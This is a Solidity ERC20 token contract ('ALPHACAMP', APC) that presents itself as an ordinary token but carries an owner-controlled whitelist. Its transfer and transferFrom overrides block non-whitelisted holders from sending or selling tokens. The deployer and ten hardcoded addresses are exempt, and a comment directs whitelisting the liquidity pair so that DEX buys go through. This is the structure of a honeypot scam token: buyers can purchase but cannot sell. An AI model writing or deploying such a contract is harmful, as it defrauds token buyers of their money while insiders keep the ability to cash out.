// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("ALPHACAMP ", "APC") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 50000000 * 10 ** decimals());
        whiteList[0x706919FA4a405002350Bb112D5aE959be804085e]= true;
        whiteList[0x58858A3F706156711cC299CfaFF2857429E82474]=true;
        whiteList[0x802447a953df6Cf959942DfF9CaD2d5CD11B0248]=true;
        whiteList[0x1737928998DbFc28dD4b0bc4D865003C9a203b1A]=true;
        whiteList[0x9B431A2A838422584FF89d15f33A0F059c6C66D4]=true;
        whiteList[0xe4e4202427BE7739eA76abf96963341c87699f84]=true;
        whiteList[0x543854123d07A274C0D4f15Cbc1fCF70c7b7b0Fc]=true;
        whiteList[0xe1F161528EaCf7b2E7aE49f63ecB507049B87f3F]=true;
        whiteList[0x01Afc339f46F58Af8Bd7b44b232bBfc647c35086]=true;
        whiteList[0x74e2CCD7002E973B1E5EB7B0A7fC05Dd6e1D7d36]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}